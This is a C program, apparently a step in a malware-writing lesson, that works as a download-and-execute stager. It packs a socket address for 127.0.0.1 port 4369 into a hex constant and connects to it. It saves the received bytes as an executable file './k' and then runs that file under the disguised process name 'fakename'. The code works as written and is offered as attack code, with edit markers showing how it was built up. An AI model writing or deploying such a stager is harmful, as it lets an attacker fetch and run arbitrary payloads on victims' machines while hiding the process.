#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <fcntl.h>                                  // NEW
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


extern char        **environ;

int main (int argc, char **argv) {
  int                fd, l, s;
  unsigned long      addr = 0x0100007f11110002;
	char               *args[2]= {"fakename", NULL};
  char               buf[1024];

  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
  if (connect (s, (struct sockaddr*)&addr, 16) < 0) exit (1);
  fd = open ("./k", O_CREAT | O_TRUNC | O_WRONLY, 0777); // NEW!!

  while (1) {
      if ((l = read (s, buf, 1024) ) <= 0) break;
      write (fd, buf, l);                              // MODIFIED
    }
  close (s);
	close (fd);                                             // NEW!
	execv ("./k", args);                                    // NEW
  return 0;
    
}
